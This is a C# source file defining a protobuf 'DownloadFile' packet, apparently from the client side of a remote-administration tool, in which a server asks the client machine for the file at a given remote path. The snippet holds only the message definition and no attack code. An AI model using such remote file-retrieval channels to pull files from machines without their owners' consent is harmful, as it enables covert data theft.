using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DownloadFile : IPacket
    {
        public DownloadFile()
        {
        }

        public DownloadFile(string remotepath, int id)
        {
            RemotePath = remotepath;
            ID = id;
        }

        [ProtoMember(1)]
        public string RemotePath { get; set; }

        [ProtoMember(2)]
        public int ID { get; set; }

        public void Execute(Client client)
        {
            client.Send<DownloadFile>(this);
        }
    }
}